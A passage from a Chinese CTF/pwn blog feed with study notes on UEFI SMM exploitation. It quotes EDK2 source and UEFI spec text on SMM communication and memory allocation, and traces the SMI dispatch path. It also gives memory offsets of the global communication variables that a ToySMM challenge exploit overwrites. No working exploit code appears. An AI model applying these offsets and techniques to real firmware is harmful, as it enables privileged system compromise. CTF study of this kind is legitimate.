function_">SmmCommunicationCommunicate</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span><br><span class="line"><span class="params">  IN OUT VOID                              *CommBuffer,</span></span><br><span class="line"><span class="params">  IN OUT UINTN                             *CommSize OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS                  Status;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER  *CommunicateHeader;</span><br><span class="line">  BOOLEAN                     OldInSmm;</span><br><span class="line">  UINTN                       TempCommSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check parameters</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (CommBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommBuffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CommSize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    TempCommSize = OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data) + CommunicateHeader-&gt;MessageLength;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    TempCommSize = *CommSize;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// CommSize must hold HeaderGuid and MessageLength</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (TempCommSize &lt; OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// If not already in SMM, then generate a Software SMI</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (!gSmmCorePrivate-&gt;InSmm &amp;&amp; gSmmCorePrivate-&gt;SmmEntryPointRegistered) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Put arguments for Software SMI in gSmmCorePrivate</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    gSmmCorePrivate-&gt;CommunicationBuffer = CommBuffer;</span><br><span class="line">    gSmmCorePrivate-&gt;BufferSize          = TempCommSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Generate Software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Status = mSmmControl2-&gt;Trigger (mSmmControl2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (EFI_ERROR (Status)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_UNSUPPORTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Return status from software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (CommSize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      *CommSize = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gSmmCorePrivate-&gt;ReturnStatus;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><p>第一个参数是指向这个<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>的指针</p></li><li><p>第二个参数一般是一个<code>EFI_SMM_COMMUNICATE_HEADER</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID             HeaderGuid;</span><br><span class="line">  UINTN                MessageLength;</span><br><span class="line">  UINT8                Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125;   EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><ul><li><p><code>HeaderGuid</code></p><p>Allows for disambiguation of the message format. Type <em>EFI_GUID</em> is defined in <em>InstallProtocolInterface()</em> .</p></li><li><p><code>MessageLength</code></p><p>Describes the size of <em>Data</em> (in bytes) and does not include the size of the header.</p></li><li><p><code>Data</code></p><p>Designates an array of bytes that is <em>MessageLength</em> in size</p></li></ul></li><li><p>第三个参数是size,一般不需要特意指定为NULL即可</p></li></ul><p>该函数将消息复制到全局变量中<strong>并触发软件 SMI 来处理它</strong>。<u>该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</u></p><hr><p>所以,一般这类题目都需要着重分析题目SMM程序注册的handler</p><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>bootservices中有这两个指针<strong>AllocatePages</strong>与<strong>AllocatePool</strong>都可以用于分配内存</p><blockquote><p>AllocatePages</p><p>Allocates pages of a particular type.</p></blockquote><p><strong>Summary</strong></p><p>Allocates memory pages from the system.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_ALLOCATE_PAGES) (</span><br><span class="line">   IN EFI_ALLOCATE_TYPE                   Type,</span><br><span class="line">   IN EFI_MEMORY_TYPE                     MemoryType,</span><br><span class="line">   IN UINTN                               Pages,</span><br><span class="line">   IN OUT EFI_PHYSICAL_ADDRESS            *Memory</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>Type</p><p>The type of allocation to perform. See “Related Definitions.”</p></li><li><p>MemoryType</p><p>The type of memory to allocate. The type EFI_MEMORY_TYPE is defined in “Related Definitions” below. These memory types are also described in more detail in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-before-exitbootservices">Memory Type Usage before ExitBootServices()</a>, and <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-after-exitbootservices">Memory Type Usage after ExitBootServices()</a> . Normal allocations (that is, allocations by any UEFI application) are of type EfiLoaderData. <em>MemoryType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>MemoryType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p></li><li><p>Pages</p><p>The number of contiguous 4 KiB pages to allocate.</p></li><li><p>Memory</p><p>Pointer to a physical address. On input, the way in which the address is used depends on the value of <em>Type</em>. See “Description” for more information. On output the address is set to the base of the page range that was allocated. See “Related Definitions.”</p></li></ul><p><strong>NOTE</strong>: UEFI Applications, UEFI Drivers, and UEFI OS Loaders <em>must not allocate memory of types</em> EfiReservedMemoryType, EfiMemoryMappedIO, <em>and</em> EfiUnacceptedMemoryType.</p><p><strong>Related Definitions</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_ALLOCATE_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These types are discussed in the &quot;Description&quot; section below.</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   AllocateAnyPages,</span><br><span class="line">   AllocateMaxAddress,</span><br><span class="line">   AllocateAddress,</span><br><span class="line">   MaxAllocateType</span><br><span class="line">&#125; EFI_ALLOCATE_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_MEMORY_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These type values are discussed in Memory Type Usage before ExitBootServices()  and  Memory Type Usage after ExitBootServices().</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   EfiReservedMemoryType,</span><br><span class="line">   EfiLoaderCode,</span><br><span class="line">   EfiLoaderData,</span><br><span class="line">   EfiBootServicesCode,</span><br><span class="line">   EfiBootServicesData,</span><br><span class="line">   EfiRuntimeServicesCode,</span><br><span class="line">   EfiRuntimeServicesData,</span><br><span class="line">   EfiConventionalMemory,</span><br><span class="line">   EfiUnusableMemory,</span><br><span class="line">   EfiACPIReclaimMemory,</span><br><span class="line">   EfiACPIMemoryNVS,</span><br><span class="line">   EfiMemoryMappedIO,</span><br><span class="line">   EfiMemoryMappedIOPortSpace,</span><br><span class="line">   EfiPalCode,</span><br><span class="line">   EfiPersistentMemory,</span><br><span class="line">   EfiUnacceptedMemoryType,</span><br><span class="line">   EfiMaxMemoryType</span><br><span class="line">&#125; EFI_MEMORY_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_PHYSICAL_ADDRESS</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="keyword">typedef</span> UINT64 EFI_PHYSICAL_ADDRESS;</span><br></pre></td></tr></table></figure><p><strong>Description</strong></p><p>The AllocatePages() function allocates the requested number of pages and returns a pointer to the base address of the page range in the location referenced by <em>Memory</em>. The function scans the memory map to locate free pages. When it finds a physically contiguous block of pages that is large enough and also satisfies the allocation requirements of <em>Type</em>, it changes the memory map to indicate that the pages are now of type <em>MemoryType</em>.</p><p>In general, UEFI OS loaders and UEFI applications should allocate memory (and pool) of type EfiLoaderData. UEFI boot service drivers must allocate memory (and pool) of type EfiBootServicesData. UREFI runtime drivers should allocate memory (and pool) of type EfiRuntimeServicesData (although such allocation can only be made during boot services time).</p><p>Allocation requests of <em>Type</em> AllocateAnyPages allocate any available range of pages that satisfies the request. On input, the address pointed to by <em>Memory</em> is ignored.</p><p>Allocation requests of <em>Type</em> <em>AllocateMaxAddress</em> allocate any available range of pages whose uppermost address is less than or equal to the address pointed to by <em>Memory</em> on input.</p><p>Allocation requests of <em>Type</em> AllocateAddress allocate pages at the address pointed to by <em>Memory</em> on input.</p><p><strong>NOTE</strong>: <em>UEFI drivers and UEFI applications that are not targeted for a specific implementation must perform memory allocations for the following runtime types using AllocateAnyPages address mode:</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EfiACPIReclaimMemory,</span><br><span class="line">EfiACPIMemoryNVS,</span><br><span class="line">EfiRuntimeServicesCode,</span><br><span class="line">EfiRuntimeServicesData,</span><br><span class="line">EfiReservedMemoryType.</span><br></pre></td></tr></table></figure><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>The requested pages were allocated.</th></tr></thead><tbody><tr><td>EFI_OUT_OF_RESOURCEST</td><td>The pages could not be allocated.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Type</em> is not AllocateAnyPages or AllocateMaxAddress or AllocateAddress</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>MemoryType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>MemoryType</em> is EfiPersistentMemoryType or EfiUnacceptedMemory.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Memory</em> is NULL.</td></tr><tr><td>EFI_NOT_FOUND</td><td>The requested pages could not be found.</td></tr></tbody></table></div><hr><blockquote><p>AllocatePool</p><p>Allocates a pool of a particular type.</p></blockquote><p><strong>Summary</strong></p><p>Allocates pool memory.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI  *EFI_ALLOCATE_POOL) (</span><br><span class="line">   IN EFI_MEMORY_TYPE            PoolType,</span><br><span class="line">   IN UINTN                      Size,</span><br><span class="line">   OUT VOID                      **Buffer</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>PoolType</p><p>The type of pool to allocate. Type EFI_MEMORY_TYPE is defined in the <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-allocatepages">EFI_BOOT_SERVICES.AllocatePages()</a> function description. <em>PoolType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>PoolType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p></li><li><p>Size</p><p>The number of bytes to allocate from the pool.</p></li><li><p>Buffer</p><p>A pointer to a pointer to the allocated buffer if the call succeeds; undefined otherwise.</p></li></ul><p><strong>Note:</strong> <em>UEFI applications and UEFI drivers must not allocate memory of type</em> EfiReservedMemoryType.</p><p><strong>Description</strong></p><p>The AllocatePool() function allocates a memory region of Size bytes from memory of type <em>PoolType</em> and returns the address of the allocated memory in the location referenced by <em>Buffer</em>. This function allocates pages from EfiConventionalMemory as needed to grow the requested pool type. All allocations are eight-byte aligned.</p><p>The allocated pool memory is returned to the available pool with the <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#id17">EFI_BOOT_SERVICES.FreePool()</a> function.</p><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>The requested number of bytes was allocated.</th></tr></thead><tbody><tr><td>EFI_OUT_OF_RESOURCES</td><td>The pool requested could not be allocated.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>PoolType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>PoolType</em> is EfiPersistentMemory.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Buffer</em> is NULL.</td></tr></tbody></table></div><hr><p>The agent invoking the communication interface at runtime may be virtually mapped. The MM infrastructure code and handlers, on the other hand, execute in physical mode.As a result, the non- MM agent, which may be executing in the virtual-mode OS context as a result of an OS invocation of the UEFI SetVirtualAddressMap() service, should use a contiguous memory buffer with a physical address before invoking this service. If the virtual address of the buffer is used, the MM Driver may not know how to do the appropriate virtual-to-physical conversion.<br>在<a href="https://edk2.groups.io/g/devel/topic/30910271">这里</a>讨论了这个问题，指出<code>EfiReservedMemoryType</code>, <code>EfiACPIMemoryNVS</code>或<code>EfiRuntimeServicesData</code>可以满足条件，<strong>最后发现<code>EfiRuntimeServicesData</code>类型的内存可以让<code>SmmCommunication-&gt;Communicate</code>返回<code>EFI_SUCCESS</code></strong>，推测完成了与SMM的态通信，也可以结合<a href="https://github.com/tianocore/edk2/blob/3840c35e34d1c992268092b6366e26f2acc55a75/UefiCpuPkg/PiSmmCommunication/PiSmmCommunicationPei.c#L275">源码</a>来具体分析。</p><h2 id="debugon"><a href="#debugon" class="headerlink" title="debugon"></a>debugon</h2><p>在qemu启动脚本中加入这一句</p><p><code>-global isa-debugcon.iobase=0x402 -debugcon file:./debug.log</code></p><p>之后<code>cat debug.log</code>即可获得许多调试信息</p><h2 id="SMRAM"><a href="#SMRAM" class="headerlink" title="SMRAM"></a>SMRAM</h2><p>SMM状态下有类似SMAP和SMEP这样的保护</p><p>其只能访问位于SMRAM的内存</p><p>否则会有检测<a href="https://github.com/tianocore/edk2/blob/master/MdePkg/Library/SmmMemLib/SmmMemLib.c">edk2/MdePkg/Library/SmmMemLib/SmmMemLib.c at master · tianocore/edk2 (github.com)</a></p><h2 id="SMI流程"><a href="#SMI流程" class="headerlink" title="SMI流程"></a>SMI流程</h2><p>我们一般直接交互处于DXE状态</p><p>通过SMI进入SMM后：</p><ul><li>会将当前状态存在SMBASE + 0x8000 + 0x7c00，比如各个寄存器的值</li><li>执行SMBASE + 0x8000处的代码</li></ul><p>SMBASE + 0x8000会被初始化为gcSmiHandlerTemplate</p><p>函数调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcSmiHandlerTemplate</span><br><span class="line">-&gt; SmiRendezvous</span><br><span class="line">-&gt; BSPHandler</span><br><span class="line">-&gt; gSmmCpuPrivate-&gt;SmmCoreEntry</span><br><span class="line">   SmmEntryPoint</span><br><span class="line">-&gt; SmiManage (IMAGE, GUID, CommBuffer)</span><br></pre></td></tr></table></figure><p>SmiManage中最后会执行之前注册的Handler，ToySMM中是ToyMain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                   (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                   Context,</span><br><span class="line">                                   CommBuffer,</span><br><span class="line">                                   CommBufferSize</span><br><span class="line">                                   );</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>SmmEntryPoint将gSmmCorePrivate-&gt;CommunicationBuffer的数据传递给了SmiManage，<strong>gSmmCorePrivate是个全局变量</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">  </span><br><span class="line">   CommunicationBuffer = gSmmCorePrivate-&gt;CommunicationBuffer;</span><br><span class="line">   BufferSize          = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">  </span><br><span class="line">……</span><br><span class="line">  </span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommunicationBuffer;</span><br><span class="line">       <span class="comment">// BufferSize was updated by the SafeUintnSub() call above.</span></span><br><span class="line">       Status = SmiManage (</span><br><span class="line">                  &amp;CommunicateHeader-&gt;HeaderGuid,</span><br><span class="line">                  <span class="literal">NULL</span>,</span><br><span class="line">                  CommunicateHeader-&gt;Data,</span><br><span class="line">                  &amp;BufferSize</span><br><span class="line">                  );</span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure></li><li><p>SmiManage调用SmmCoreFindSmiEntry通过HandlerType（GUID）查找之前注册的SmiHandler，调用Handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiManage</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN     CONST EFI_GUID  *HandlerType,</span></span><br><span class="line"><span class="params">  IN     CONST VOID      *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID            *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN           *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Non-root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, FALSE);</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">    Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                       (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                       Context,</span><br><span class="line">                                       CommBuffer,</span><br><span class="line">                                       CommBufferSize</span><br><span class="line">                                       );</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure></li></ul><p>gSmmCorePrivate全局变量定义在PiSmmIpl模块，被初始化为mSmmCorePrivateData</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br></pre></td></tr></table></figure><h2 id="全局comm变量"><a href="#全局comm变量" class="headerlink" title="全局comm变量"></a>全局comm变量</h2><p>在ToySMM那题的第二种exp写法中,这位师傅并不分配新的结构体然后再去调用<code>communicate()</code>,而是直接布置在全局变量中并触发(见上一小节),尽管完全可以用写法1替代,但我仍然疑惑那些变量是如何找到的</p><p>最终我在源代码中找到了这些</p><p>在<code>/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Communication Protocol instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// PI 1.7 MM Communication Protocol 2 instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_MM_COMMUNICATION2_PROTOCOL  mMmCommunication2 = &#123;</span><br><span class="line">  SmmCommunicationMmCommunicate2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Core Private Data structure that contains the data shared between</span></span><br><span class="line"><span class="comment">// the SMM IPL and the SMM Core.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  mSmmCorePrivateData = &#123;</span><br><span class="line">  SMM_CORE_PRIVATE_DATA_SIGNATURE,    <span class="comment">// Signature</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmIplImageHandle</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// SmramRangeCount</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmramRanges</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmEntryPoint</span></span><br><span class="line">  FALSE,                              <span class="comment">// SmmEntryPointRegistered</span></span><br><span class="line">  FALSE,                              <span class="comment">// InSmm</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// Smst</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// CommunicationBuffer</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// BufferSize</span></span><br><span class="line">  EFI_SUCCESS                         <span class="comment">// ReturnStatus</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Global pointer used to access mSmmCorePrivateData from outside and inside SMM</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM IPL global variables</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_CONTROL2_PROTOCOL  *mSmmControl2;</span><br><span class="line">EFI_SMM_ACCESS2_PROTOCOL   *mSmmAccess;</span><br><span class="line">EFI_SMRAM_DESCRIPTOR       *mCurrentSmramRange;</span><br><span class="line">BOOLEAN                    mSmmLocked = FALSE;</span><br><span class="line">BOOLEAN                    mEndOfDxe  = FALSE;</span><br><span class="line">EFI_PHYSICAL_ADDRESS       mSmramCacheBase;</span><br><span class="line">UINT64                     mSmramCacheSize;</span><br><span class="line"></span><br><span class="line">EFI_SMM_COMMUNICATE_HEADER                  mCommunicateHeader;</span><br><span class="line">EFI_LOAD_FIXED_ADDRESS_CONFIGURATION_TABLE  *mLMFAConfigurationTable = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>但又令我困惑的是在实际内存中,这些变量似乎并没有按照源码中的间隔排布(顺序是对的,但中间插入了许多其他变量)</p><p>不过我们也能够确定偏移,以<code>mSmmCommunication</code>偏移为0</p><div class="table-container"><table><thead><tr><th>name</th><th>offset</th></tr></thead><tbody><tr><td>mSmmCommunication</td><td>0</td></tr><tr><td>mSmmCorePrivateData</td><td>0x70</td></tr><tr><td>mSmmCorePrivateData.CommunicationBuffer</td><td>0xa8</td></tr><tr><td>mSmmCorePrivateData.BufferSize</td><td>0xb0</td></tr><tr><td>mCommunicateHeader.HeaderGuid</td><td>0xf0</td></tr><tr><td>mCommunicateHeader.MessageLength</td><td>0x100</td></tr><tr><td>mCommunicateHeader.Data</td><td>0x108</td></tr></tbody></table></div><p>不知道是否会受版本影响,如果不同另外调试便是</p>]]></content>
    
    
    <summary type="html">hard</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="uefi" scheme="https://ixout.github.io/tags/uefi/"/>
    
  </entry>
  
  <entry>
    <title>DirtyPageTable</title>
    <link href="https://ixout.github.io/posts/29003/"/>
    <id>https://ixout.github.io/posts/29003/</id>
    <published>2024-04-06T12:15:31.000Z</published>
    <updated>2024-12-28T03:47:18.661Z</updated>
    
